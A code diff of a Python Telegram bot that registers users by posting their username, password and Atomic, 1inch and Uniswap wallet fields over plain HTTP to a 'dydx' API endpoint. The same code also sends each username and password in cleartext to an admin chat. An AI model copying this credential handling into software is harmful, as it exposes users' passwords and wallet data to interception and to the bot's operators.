@@ -28,27 +28,24 @@ async def callback(update: Update,context: telegram.ext.ContextTypes.DEFAULT_TYP
     user_id = update.effective_message.chat_id
     
     if data == "register":
-        try:
-            req_data = {
-            "user_id": user_id,
-            "username": reg_log_data[user_id]['username'],
-            "password": reg_log_data[user_id]['password'],
-            "atomic_wallet": reg_log_data[user_id]['atomic'],
-            "oneinch_wallet": reg_log_data[user_id]['one_inch'],
-            "uni_wallet": reg_log_data[user_id]['uniswap']
-        }
-            req = requests.post(f"http://{address}/dydx/api/v1/telegramuser/",req_data)
-            if req.status_code == 201:
-                text = f"user has been registered with user_id:'{user_id}' username: '{reg_log_data[user_id]['username']}' and password: '{reg_log_data[user_id]['password']}'"
-                await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=text)
-                await context.bot.send_message(chat_id=user_id,text="your registration complited please wait for confirmation")
-                msg_id = 0
-            else:
-                await update.message.reply_text('something happend, we could not connect to server')
-                return
-        except:
+        req_data = {
+        "user_id": user_id,
+        "username": reg_log_data[user_id]['username'],
+        "password": reg_log_data[user_id]['password'],
+        "atomic_wallet": reg_log_data[user_id]['atomic'],
+        "oneinch_wallet": reg_log_data[user_id]['one_inch'],
+        "uni_wallet": reg_log_data[user_id]['uniswap']
+    }
+        req = requests.post(f"http://{address}/dydx/api/v1/telegramuser/",req_data)
+        if req.status_code == 201:
+            text = f"user has been registered with user_id:'{user_id}' username: '{reg_log_data[user_id]['username']}' and password: '{reg_log_data[user_id]['password']}'"
+            await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=text)
+            await context.bot.send_message(chat_id=user_id,text="your registration complited please wait for confirmation")
+            msg_id = 0
+        else:
             await update.message.reply_text('something happend, we could not connect to server')
             return
+        return
         
     if "balance" in data:
         match = re.search(r":(\d+)", data)
